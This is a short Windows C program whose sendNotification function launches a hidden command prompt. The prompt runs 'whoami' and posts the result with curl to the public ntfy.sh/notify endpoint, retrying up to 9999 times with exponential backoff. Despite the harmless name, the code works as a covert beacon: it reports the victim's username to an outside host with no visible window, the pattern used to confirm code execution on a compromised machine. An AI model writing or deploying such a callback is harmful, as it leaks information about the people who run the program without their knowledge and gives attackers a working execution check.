#include <stdio.h>
#include <stdlib.h>

#include <windows.h>
#include <time.h>


int sendNotification() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // CMD command here
    char arg[] = "cmd.exe /c for /f \"delims=\" %i in ('whoami') do curl -d \"%i\" ntfy.sh/notify";

    // Run process
    int result = CreateProcessA(NULL, arg, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    
    if (result) {
        // Wait for the process to finish and get the exit code
        WaitForSingleObject(pi.hProcess, INFINITE);
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        
        return exitCode; // Return the exit code
    } else {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return -1; // Return error code
    }
}

void exponential_backoff(int max_tries, int base_delay, int max_delay) {
	int retry_count = 0;

	while (retry_count <= max_tries) {
		if (sendNotification() == 0){
			printf("Sucess!!");
			exit(0);
		} else {
			int wait_time = base_delay * (1 << retry_count); // 2^retry_count
			if (wait_time > max_delay) {
				wait_time = max_delay; // Cap the wait time bruh
			}

			printf("Operation failed. Retrying in %d seconds\n", wait_time);
			Sleep(wait_time * 1000);

			retry_count++;
		}
	}
	printf("Max retries reached. Operation failed.\n");
}

int main() {

	exponential_backoff(9999, 1, 32);
	
	
	return 0;
}
